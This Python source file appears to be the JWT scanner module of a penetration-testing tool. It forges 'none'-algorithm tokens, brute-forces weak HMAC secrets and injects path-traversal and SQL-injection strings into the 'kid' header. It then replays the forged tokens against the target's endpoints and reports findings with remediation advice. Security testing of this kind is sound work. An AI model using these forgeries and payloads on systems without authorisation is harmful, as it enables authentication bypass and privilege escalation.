"""
Lynx VAPT - JWT Security Scanner

Comprehensive JWT (JSON Web Token) vulnerability testing:
- None algorithm exploit
- Algorithm confusion (RS256 → HS256)
- Weak secret detection
- JWK injection attacks
- Token manipulation
- Signature bypass

Author: Lynx Team
"""

import asyncio
import re
import json
import base64
import hashlib
import hmac
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

from scanners.base import BaseScanner
from common import event_manager, TestingZone


@dataclass
class JWTInfo:
    """Parsed JWT information."""
    raw: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    algorithm: str
    is_valid_format: bool = True
    issues: List[str] = None
    
    def __post_init__(self):
        self.issues = self.issues or []


class JWTScanner(BaseScanner):
    """
    JWT Security Testing Scanner.
    
    Tests for:
    - None algorithm bypass
    - Algorithm confusion (RS256 → HS256)
    - Weak secret brute force
    - JWK header injection
    - Token manipulation (role escalation)
    - Signature validation issues
    - Expired token acceptance
    - Key ID (kid) injection
    """
    
    # Common weak secrets to test
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "key",
        "jwt_secret", "supersecret", "changeme", "test",
        "development", "production", "token_secret",
        "my_secret", "secret_key", "jwt", "auth",
        "secure", "private", "qwerty", "letmein",
        "welcome", "passw0rd", "default", "master",
    ]
    
    # JWT patterns in responses
    JWT_PATTERNS = [
        r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # Standard JWT
        r'["\'](?:token|jwt|access_token|id_token|auth_token)["\']:\s*["\']([^"\']+)["\']',
        r'Bearer\s+(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
    ]
    
    def __init__(self, context):
        super().__init__(context)
        self.name = "JWTScanner"
        self.zone = TestingZone.ZONE_B  # Authentication & Authorization
        self.found_tokens: List[JWTInfo] = []
        self.executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="jwt_hmac")
        self.batch_size = 20
        self.total_tests = 0
        self.completed_tests = 0
    
    async def run(self):
        """Run JWT security scan."""
        await event_manager.emit("log", f"[{self.name}] Starting JWT security scan...")
        
        # Collect JWTs from various sources
        await self._collect_tokens()
        
        if not self.found_tokens:
            await event_manager.emit("log", f"[{self.name}] No JWT tokens found to test")
            return
        
        await event_manager.emit("log", f"[{self.name}] Found {len(self.found_tokens)} JWT tokens to test")
        
        # Test each token
        for jwt_info in self.found_tokens:
            await self._test_token(jwt_info)
    
    async def _collect_tokens(self):
        """Collect JWT tokens from responses."""
        target = self.context.target
        
        try:
            async with self.context.session.get(target) as response:
                text = await response.text()
                
                # Check response body
                for pattern in self.JWT_PATTERNS:
                    for match in re.finditer(pattern, text):
                        token = match.group(1) if match.lastindex else match.group(0)
                        jwt_info = self._parse_jwt(token)
                        if jwt_info and jwt_info.is_valid_format:
                            self.found_tokens.append(jwt_info)
                
                # Check Set-Cookie headers
                for cookie in response.headers.getall('Set-Cookie', []):
                    for pattern in self.JWT_PATTERNS:
                        match = re.search(pattern, cookie)
                        if match:
                            token = match.group(1) if match.lastindex else match.group(0)
                            jwt_info = self._parse_jwt(token)
                            if jwt_info and jwt_info.is_valid_format:
                                self.found_tokens.append(jwt_info)
                
                # Check for common API endpoints that return JWTs
                await self._check_auth_endpoints()
                
        except Exception as e:
            await event_manager.emit("log", f"[{self.name}] Error collecting tokens: {e}")
    
    async def _check_auth_endpoints(self):
        """Check common auth endpoints for JWTs."""
        auth_endpoints = [
            "/api/auth/token",
            "/api/login",
            "/api/v1/auth",
            "/oauth/token",
            "/token",
            "/auth/token",
            "/api/token",
        ]
        
        from urllib.parse import urljoin
        
        for endpoint in auth_endpoints:
            try:
                url = urljoin(self.context.target, endpoint)
                async with self.context.session.get(url, timeout=5) as response:
                    if response.status == 200:
                        text = await response.text()
                        for pattern in self.JWT_PATTERNS:
                            for match in re.finditer(pattern, text):
                                token = match.group(1) if match.lastindex else match.group(0)
                                jwt_info = self._parse_jwt(token)
                                if jwt_info and jwt_info.is_valid_format:
                                    self.found_tokens.append(jwt_info)
            except Exception:
                continue
    
    def _parse_jwt(self, token: str) -> Optional[JWTInfo]:
        """Parse a JWT token."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header_b64 = parts[0]
            header_json = self._base64_decode(header_b64)
            header = json.loads(header_json)
            
            # Decode payload
            payload_b64 = parts[1]
            payload_json = self._base64_decode(payload_b64)
            payload = json.loads(payload_json)
            
            # Signature
            signature = parts[2]
            
            algorithm = header.get('alg', 'unknown')
            
            return JWTInfo(
                raw=token,
                header=header,
                payload=payload,
                signature=signature,
                algorithm=algorithm
            )
            
        except Exception:
            return None
    
    def _base64_decode(self, data: str) -> str:
        """Decode base64url."""
        # Add padding if needed
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        # Replace URL-safe characters
        data = data.replace('-', '+').replace('_', '/')
        
        return base64.b64decode(data).decode('utf-8')
    
    def _base64_encode(self, data: str) -> str:
        """Encode to base64url."""
        encoded = base64.b64encode(data.encode()).decode()
        return encoded.replace('+', '-').replace('/', '_').rstrip('=')
    
    async def _test_token(self, jwt_info: JWTInfo):
        """Run all tests on a JWT token."""
        await self._test_none_algorithm(jwt_info)
        await self._test_algorithm_confusion(jwt_info)
        await self._test_weak_secrets(jwt_info)
        await self._test_jwk_injection(jwt_info)
        await self._test_kid_injection(jwt_info)
        await self._test_payload_manipulation(jwt_info)
        await self._analyze_token(jwt_info)
    
    async def _test_none_algorithm(self, jwt_info: JWTInfo):
        """Test None algorithm bypass."""
        # Create token with "none" algorithm
        modified_header = jwt_info.header.copy()
        modified_header['alg'] = 'none'
        
        header_b64 = self._base64_encode(json.dumps(modified_header))
        payload_b64 = self._base64_encode(json.dumps(jwt_info.payload))
        
        # Try with empty signature
        forged_tokens = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}",
        ]
        
        for forged in forged_tokens:
            if await self._test_token_acceptance(forged):
                await self.emit_vulnerability(
                    "JWT None Algorithm Bypass",
                    f"Server accepts JWT with 'none' algorithm.\n"
                    f"Original token: {jwt_info.raw[:50]}...\n"
                    f"Forged token: {forged[:50]}...",
                    severity="P1",
                    remediation="Ensure the server explicitly validates the algorithm and rejects 'none'.",
                    url=self.context.target,
                    payload=forged
                )
                return
    
    async def _test_algorithm_confusion(self, jwt_info: JWTInfo):
        """Test RS256 → HS256 algorithm confusion."""
        if jwt_info.algorithm not in ['RS256', 'RS384', 'RS512']:
            return
        
        # This attack requires the server's public key
        # For now, we just flag the potential vulnerability
        await self.emit_vulnerability(
            "Potential JWT Algorithm Confusion",
            f"Token uses asymmetric algorithm {jwt_info.algorithm}.\n"
            f"If server doesn't validate algorithm type, it may be vulnerable to RS256→HS256 confusion.\n"
            f"Test manually with the server's public key as the HMAC secret.",
            severity="P2",
            remediation="Explicitly validate the algorithm in the JWT library configuration.",
            url=self.context.target,
            payload=jwt_info.raw[:100]
        )
    
    def _compute_hmac_signature(self, args: Tuple[str, str, str]) -> Tuple[str, bool]:
        """
        Compute HMAC signature for a secret (runs in thread pool).
        
        Returns: (secret, is_match)
        """
        secret, unsigned_data, algorithm = args
        try:
            if algorithm == 'HS256':
                computed = hmac.new(
                    secret.encode(),
                    unsigned_data.encode(),
                    hashlib.sha256
                ).digest()
            elif algorithm == 'HS384':
                computed = hmac.new(
                    secret.encode(),
                    unsigned_data.encode(),
                    hashlib.sha384
                ).digest()
            elif algorithm == 'HS512':
                computed = hmac.new(
                    secret.encode(),
                    unsigned_data.encode(),
                    hashlib.sha512
                ).digest()
            else:
                return (secret, False)
            
            computed_b64 = base64.urlsafe_b64encode(computed).decode().rstrip('=')
            return (secret, computed_b64)
        except Exception:
            return (secret, False)
    
    async def _test_weak_secrets(self, jwt_info: JWTInfo):
        """Test for weak HMAC secrets with batch processing and async threads."""
        if jwt_info.algorithm not in ['HS256', 'HS384', 'HS512']:
            return
        
        # Get the unsigned part
        parts = jwt_info.raw.split('.')
        unsigned_data = f"{parts[0]}.{parts[1]}"
        
        # Prepare batch arguments
        batch_args = [
            (secret, unsigned_data, jwt_info.algorithm)
            for secret in self.WEAK_SECRETS
        ]
        
        total_secrets = len(batch_args)
        self.total_tests += total_secrets
        
        # Process in batches
        for i in range(0, total_secrets, self.batch_size):
            batch = batch_args[i:i + self.batch_size]
            
            # Submit batch to thread pool
            loop = asyncio.get_running_loop()
            batch_results = await loop.run_in_executor(
                self.executor,
                lambda: [self._compute_hmac_signature(args) for args in batch]
            )
            
            # Process results
            for secret, result in batch_results:
                self.completed_tests += 1
                
                # Check if result is the signature string (match found)
                if result == jwt_info.signature:
                    await self.emit_vulnerability(
                        "JWT Weak Secret",
                        f"JWT is signed with weak secret: '{secret}'\n"
                        f"Algorithm: {jwt_info.algorithm}\n"
                        f"This allows attackers to forge arbitrary tokens.",
                        severity="P1",
                        remediation="Use a cryptographically secure random secret of at least 256 bits.",
                        url=self.context.target,
                        payload=f"Secret: {secret}"
                    )
                    return
                
                # Progress update every 50 tests
                if self.completed_tests % 50 == 0:
                    progress = (self.completed_tests / self.total_tests) * 100
                    await event_manager.emit(
                        "log",
                        f"[{self.name}] Weak secret test progress: {self.completed_tests}/{self.total_tests} ({progress:.1f}%)"
                    )
            
            # Small delay to prevent CPU spike
            await asyncio.sleep(0.01)
    
    async def _test_jwk_injection(self, jwt_info: JWTInfo):
        """Test JWK header injection."""
        if 'jwk' in jwt_info.header or 'jku' in jwt_info.header:
            await self.emit_vulnerability(
                "JWT JWK Header Present",
                f"JWT contains JWK/JKU header parameter.\n"
                f"Header: {json.dumps(jwt_info.header)}\n"
                f"May be vulnerable to key injection attacks.",
                severity="P2",
                remediation="Remove JWK/JKU headers and use server-side key management.",
                url=self.context.target,
                payload=jwt_info.raw[:100]
            )
    
    async def _test_kid_injection(self, jwt_info: JWTInfo):
        """Test Key ID (kid) injection."""
        if 'kid' in jwt_info.header:
            kid = jwt_info.header['kid']
            
            # Check for potential injection patterns
            injection_payloads = [
                "../../etc/passwd",
                "'; DROP TABLE users; --",
                "/dev/null",
                "key' OR '1'='1",
            ]
            
            for payload in injection_payloads:
                modified_header = jwt_info.header.copy()
                modified_header['kid'] = payload
                
                header_b64 = self._base64_encode(json.dumps(modified_header))
                payload_b64 = jwt_info.raw.split('.')[1]
                
                # Sign with empty key (for path traversal to /dev/null)
                forged = f"{header_b64}.{payload_b64}."
                
                if await self._test_token_acceptance(forged):
                    await self.emit_vulnerability(
                        "JWT KID Injection",
                        f"Server accepts token with injected 'kid' parameter.\n"
                        f"Injected kid: {payload}",
                        severity="P1",
                        remediation="Validate and sanitize the 'kid' parameter. Use allowlist for key IDs.",
                        url=self.context.target,
                        payload=forged[:100]
                    )
                    return
    
    async def _test_payload_manipulation(self, jwt_info: JWTInfo):
        """Test for privilege escalation via payload manipulation."""
        # Look for role/privilege fields
        privilege_fields = ['role', 'admin', 'is_admin', 'isAdmin', 'privileges', 'scope', 'permissions']
        
        for field in privilege_fields:
            if field in jwt_info.payload:
                current_value = jwt_info.payload[field]
                
                # Suggest escalation values
                escalation_values = {
                    'role': ['admin', 'administrator', 'root', 'superuser'],
                    'admin': [True, 1, 'true', 'yes'],
                    'is_admin': [True, 1],
                    'isAdmin': [True, 1],
                    'privileges': ['*', 'all', 'admin'],
                    'scope': 'admin read write delete',
                    'permissions': ['*'],
                }
                
                await self.emit_vulnerability(
                    "JWT Privilege Field Detected",
                    f"JWT contains privilege-related field: '{field}'\n"
                    f"Current value: {current_value}\n"
                    f"If signature is weak or bypassable, this can be escalated.\n"
                    f"Try values: {escalation_values.get(field, ['escalated'])}",
                    severity="P3",
                    remediation="Ensure token signature is properly validated and use server-side authorization.",
                    url=self.context.target,
                    payload=json.dumps({field: current_value})
                )
    
    async def _analyze_token(self, jwt_info: JWTInfo):
        """Analyze JWT for general security issues."""
        issues = []
        
        # Check for sensitive data in payload
        sensitive_fields = ['password', 'secret', 'credit_card', 'ssn', 'apikey', 'api_key']
        for field in sensitive_fields:
            if field in str(jwt_info.payload).lower():
                issues.append(f"Sensitive field '{field}' found in payload")
        
        # Check expiration
        if 'exp' in jwt_info.payload:
            import time
            exp = jwt_info.payload['exp']
            if isinstance(exp, int):
                if exp < time.time():
                    issues.append("Token is expired")
                elif exp - time.time() > 86400 * 365:  # More than 1 year
                    issues.append(f"Token has very long expiration: {(exp - time.time()) / 86400:.0f} days")
        else:
            issues.append("Token has no expiration ('exp') claim")
        
        # Check for missing claims
        if 'iat' not in jwt_info.payload:
            issues.append("Missing 'iat' (issued at) claim")
        if 'iss' not in jwt_info.payload:
            issues.append("Missing 'iss' (issuer) claim")
        
        if issues:
            await self.emit_vulnerability(
                "JWT Security Issues",
                f"JWT has security concerns:\n" + "\n".join(f"- {i}" for i in issues) +
                f"\n\nPayload: {json.dumps(jwt_info.payload, indent=2)[:500]}",
                severity="P3",
                remediation="Follow JWT best practices: set expiration, avoid sensitive data in payload.",
                url=self.context.target,
                payload=jwt_info.raw[:100]
            )
    
    async def _test_token_acceptance(self, token: str) -> bool:
        """Test if server accepts a forged token."""
        headers = {
            'Authorization': f'Bearer {token}',
            'Cookie': f'token={token}; jwt={token}'
        }
        
        try:
            # Try common authenticated endpoints
            test_endpoints = [
                self.context.target,
                f"{self.context.target}/api/user",
                f"{self.context.target}/api/profile",
                f"{self.context.target}/api/me",
                f"{self.context.target}/dashboard",
            ]
            
            # Use asyncio.gather for parallel testing
            tasks = []
            for endpoint in test_endpoints:
                task = self._safe_request(endpoint, headers)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return any(r for r in results if isinstance(r, bool))
                    
        except Exception:
            pass
        
        return False
    
    async def _safe_request(self, endpoint: str, headers: dict) -> bool:
        """Safe HTTP request with timeout and error handling."""
        try:
            async with self.context.session.get(
                endpoint,
                headers=headers,
                timeout=5
            ) as response:
                return response.status == 200
        except Exception:
            return False
    
    def cleanup(self):
        """Cleanup thread pool executor."""
        try:
            self.executor.shutdown(wait=True)
        except Exception:
            pass
